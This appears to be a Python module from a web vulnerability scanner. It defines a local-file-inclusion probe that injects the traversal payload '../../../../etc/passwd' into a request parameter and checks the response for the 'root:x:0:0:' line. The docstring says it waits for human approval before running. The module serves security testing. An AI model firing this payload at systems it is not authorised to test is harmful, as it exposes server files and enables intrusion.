"""lfi_traversal_probe：本地文件包含验证型攻击函数（中危，需人工审批）。

验证逻辑：对候选参数注入路径穿越载荷读取 /etc/passwd，
响应出现 root:x:0:0 口令文件特征行即判定命中。
只读 GET，但主动读取服务器文件系统，影响面大于布尔/反射探测，
故归中危：run_scan 不自动执行，产出审批单等待人工批准/否决。
"""
from __future__ import annotations

from webvuln.contracts.attack import AttackFunction, register_attack
from webvuln.models.schemas import (
    AttackFunctionMeta, AttackResult, FindingCandidate, HttpSpec, RiskLevel,
    VulnType, now_iso,
)

TRAVERSAL_PAYLOAD = "../../../../etc/passwd"
OS_INDICATOR = "root:x:0:0:"


@register_attack
class LFITraversalProbe(AttackFunction):
    meta = AttackFunctionMeta(
        name="lfi_traversal_probe",
        vuln_type=VulnType.LFI,
        risk_level=RiskLevel.MEDIUM,
        reversible=True,
        side_effects="只读一次 GET 请求，路径穿越读取服务器文件系统",
        expected_signal="响应体出现 root:x:0:0: 口令文件特征行",
    )

    def execute(self, gateway, candidate: FindingCandidate, base: HttpSpec,
                decision_id: str) -> AttackResult:
        spec = base.model_copy(update={
            "params": {**base.params,
                       candidate.parameter: base.params.get(candidate.parameter, "") + TRAVERSAL_PAYLOAD}
        })
        resp = gateway.send(spec)
        idx = resp.body.find(OS_INDICATOR)
        matched = idx >= 0
        if matched:
            excerpt = resp.body[max(0, idx - 40): idx + len(OS_INDICATOR) + 40]
        else:
            excerpt = resp.body[:400]
        return AttackResult(
            decision_id=decision_id,
            request=spec,
            response_status=resp.status_code,
            response_excerpt=excerpt[:400],
            matched=matched,
            executed_at=now_iso(),
        )
